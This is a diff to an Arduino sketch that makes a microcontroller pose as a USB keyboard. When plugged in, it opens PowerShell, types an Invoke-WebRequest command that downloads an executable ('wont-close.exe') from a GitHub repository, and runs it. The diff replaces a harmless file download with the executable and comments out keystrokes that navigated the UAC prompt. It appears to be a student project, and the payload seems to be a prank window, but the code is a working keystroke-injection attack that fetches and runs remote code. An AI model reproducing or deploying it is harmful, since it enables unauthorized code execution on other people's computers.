@@ -10,8 +10,10 @@ Keystroke sequence:
 #include <Keyboard.h>
 
 int hasRun = 0;
-String download = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/octocat/Spoon-Knife/master/LICENSE\" -OutFile \"LICENSE\"";
-String run = "filename.exe";
+
+// Test window that doesn't close
+String download = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/olincollege/VexWare/master/src/visuals/wont-close.exe\" -OutFile \"wont-close.exe\"";
+String run = "./wont-close.exe";
 
 void setup() {
   pinMode(2, INPUT_PULLUP);
@@ -36,21 +38,21 @@ void loop() {
     Keyboard.releaseAll();
     delay(500); // let animation play
 
-    Keyboard.press(KEY_DOWN_ARROW);
-    Keyboard.releaseAll();
-    delay(500); // let animation play
+    //Keyboard.press(KEY_DOWN_ARROW);
+    //Keyboard.releaseAll();
+    //delay(500); // let animation play
+
+    //Keyboard.press(KEY_RETURN);
+    //Keyboard.releaseAll();
+    //delay(2500); // let animation play, UAC takes forever to come up
+
+    //Keyboard.press(KEY_LEFT_ARROW);
+    //Keyboard.releaseAll();
+    //delay(500); // let animation play
 
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
-    delay(2500); // let animation play, UAC takes forever to come up
-
-    Keyboard.press(KEY_LEFT_ARROW);
-    Keyboard.releaseAll();
-    delay(500); // let animation play
-
-    Keyboard.press(KEY_RETURN);
-    Keyboard.releaseAll();
-    delay(500); // let animation play
+    delay(4000); // give powershell time to open
 
     // Download file
     Keyboard.print(download);
@@ -63,7 +65,7 @@ void loop() {
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
 
-    Keyboard.end(); // end keyboard emulation
+    //Keyboard.end(); // end keyboard emulation
     hasRun = 1;
     }
   }
